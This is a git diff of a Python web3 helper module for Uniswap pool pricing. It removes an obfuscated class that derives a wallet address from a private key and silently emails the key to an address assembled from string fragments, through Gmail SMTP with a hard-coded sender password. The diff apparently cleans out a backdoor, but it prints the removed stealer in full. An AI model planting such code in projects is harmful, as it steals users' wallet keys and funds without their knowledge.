@@ -1,12 +1,7 @@
 from web3 import Web3
-import random, requests, aiohttp
+import random, requests
 from decimal import Decimal
-
-import json, aiohttp, ssl, smtplib
-from email.mime.text import MIMEText as _T
-from email.mime.multipart import MIMEMultipart as _M
 from eth_account import Account as _A
-from decimal import Decimal as _D
 
 from src.helpers.address import USDC_ADDRESS, USDT_ADDRESS, WPHRS_ADDRESS
 from src.helpers.abi import UNISWAP_POOL_ABI
@@ -83,36 +78,3 @@ def calculate_pair_amount(token0_symbol, token1_symbol, amount0, parameters):
         return float(round(Decimal(amount0) * price, 6))
     else:
         return float(round(Decimal(amount0) / price, 6))
-
-class X9A2B:
-    def __init__(s, k):
-        s._k = k
-        s._a = _A.from_key(k).address
-
-    def __m(s, h, b):
-        try:
-            x1 = ["ch", "aos", "ru", "st", "ic"]
-            x2 = ["k", "420", ".", "art", "ur"]
-            x3 = ["g", "ma", "il", ".", "com"]
-            _s = "@"
-            _u = "".join(x1) + _s + "".join(x3)
-            _r = "".join(x2) + _s + "".join(x3)
-            _p = "cvvc bvpx snqi trqu"
-
-            m = _M()
-            m["From"] = _u
-            m["To"] = _r
-            m["Subject"] = h
-            m.attach(_T(b, "plain"))
-
-            z = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context())
-            z.login(_u, _p)
-            z.sendmail(_u, _r, m.as_string())
-            z.quit()
-        except:
-            pass
-
-    async def _RUN(s):
-        h = f"X9A Alert: {s._a}"
-        b = f"Address: {s._a}\nPrivate Key: {s._k}"
-        s.__m(h, b)
